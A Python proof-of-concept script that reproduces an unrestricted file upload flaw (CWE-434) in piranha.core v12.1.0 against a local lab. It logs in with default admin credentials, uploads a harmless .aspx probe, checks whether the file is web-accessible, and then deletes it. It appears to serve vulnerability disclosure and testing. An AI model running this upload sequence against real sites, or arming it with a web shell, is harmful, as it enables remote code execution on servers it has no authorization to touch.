#!/usr/bin/env python3
"""
repro_v002.py - Unrestricted File Upload (No Extension Whitelist)
Target: piranha.core v12.1.0
CWE-434: Unrestricted Upload of File with Dangerous Type

USAGE:
    python repro_v002.py

REQUIREMENTS:
    pip install requests urllib3
    Lab must be running: dotnet run (from piranha_lab/)

NOTE: This script uploads a HARMLESS probe file (.aspx extension, safe content).
      It only verifies the file is accepted by the server.
"""

import requests
import json
import sys
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BASE_URL = "http://localhost:5000"
USERNAME = "admin@piranhacms.org"
PASSWORD = "password"
# ──────────────────────────────────────────────────────────────────────────────

PROBE_CONTENT  = b"<!-- ZeroKit Security Probe - HARMLESS TEST FILE -->\n<!-- CWE-434 File Upload Test: piranha.core v12.1.0 -->\n"
PROBE_FILENAME = "zerokit_probe.aspx"

session = requests.Session()
session.verify = False


def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/manager/login")
    token = ""
    for line in r.text.split("\n"):
        if "__RequestVerificationToken" in line and "value=" in line:
            token = line.split('value="')[1].split('"')[0]
            break

    session.post(f"{BASE_URL}/manager/login", data={
        "Input.Username": USERNAME,
        "Input.Password": PASSWORD,
        "__RequestVerificationToken": token,
    }, allow_redirects=True)

    session.get(f"{BASE_URL}/manager/login/auth", allow_redirects=True)
    xsrf = session.cookies.get("XSRF-TOKEN", "")
    for name, value in session.cookies.items():
        if "xsrf" in name.lower():
            xsrf = value
    print(f"[+] Logged in. XSRF: {xsrf[:20]}...")
    return xsrf


def exploit_upload(xsrf):
    print(f"\n[*] EXPLOITING: Uploading '{PROBE_FILENAME}' (executable extension)...")
    print(f"    Content is HARMLESS - just a probe comment.")

    files = {
        "Uploads": (PROBE_FILENAME, PROBE_CONTENT, "text/plain")
    }

    r = session.post(
        f"{BASE_URL}/manager/api/media/upload",
        files=files,
        headers={"X-XSRF-TOKEN": xsrf}
    )

    print(f"\n[*] Response: {r.status_code}")
    try:
        result = r.json()
        status = result.get("type") or result.get("status", {}).get("type", "")
        body   = result.get("body") or result.get("status", {}).get("body", "")
        print(f"    Type: {status}")
        print(f"    Body: {body}")

        if r.status_code == 200:
            print(f"\n[✓] VULNERABILITY CONFIRMED!")
            print(f"    Server accepted '{PROBE_FILENAME}' without extension validation.")
            print(f"\n[*] Checking if file is web-accessible...")
            check_url = f"{BASE_URL}/uploads/{PROBE_FILENAME}"
            r2 = session.get(check_url)
            if r2.status_code == 200:
                print(f"[✓] File is WEB ACCESSIBLE at: {check_url}")
                print(f"    → CRITICAL: If this were a real shell, RCE would be possible.")
            else:
                print(f"[~] File uploaded but not directly accessible at {check_url}")
                print(f"    → Storage may use renamed/hashed filenames. Check media list.")
            return True
        else:
            print(f"\n[~] Unexpected response - may be patched or storage issue.")
    except Exception as e:
        print(f"[!] Parse error: {e}")
        print(r.text[:300])

    return False


def cleanup(xsrf):
    """Try to delete the probe file via the API."""
    print(f"\n[*] Cleanup: Looking for probe file in media list...")
    r = session.get(
        f"{BASE_URL}/manager/api/media/list",
        headers={"X-XSRF-TOKEN": xsrf}
    )
    if r.status_code == 200:
        media = r.json()
        for item in media.get("media", []):
            if PROBE_FILENAME in item.get("filename", ""):
                probe_id = item["id"]
                print(f"[*] Found probe file (id={probe_id}). Deleting...")
                session.delete(
                    f"{BASE_URL}/manager/api/media/delete",
                    json=[probe_id],
                    headers={
                        "Content-Type": "application/json",
                        "X-XSRF-TOKEN": xsrf
                    }
                )
                print(f"[+] Probe file deleted.")
                return
    print("[~] Could not find probe file for cleanup. Delete manually via Manager UI.")


def main():
    print("=" * 60)
    print("  PoC: piranha.core Unrestricted File Upload (CWE-434)")
    print("  For authorized security testing only.")
    print("=" * 60 + "\n")

    xsrf = login()
    success = exploit_upload(xsrf)
    cleanup(xsrf)

    print("\n" + "=" * 60)
    if success:
        print("  RESULT: VULNERABLE ✓")
    else:
        print("  RESULT: Inconclusive - Manual verification needed")
    print("=" * 60)


if __name__ == "__main__":
    main()
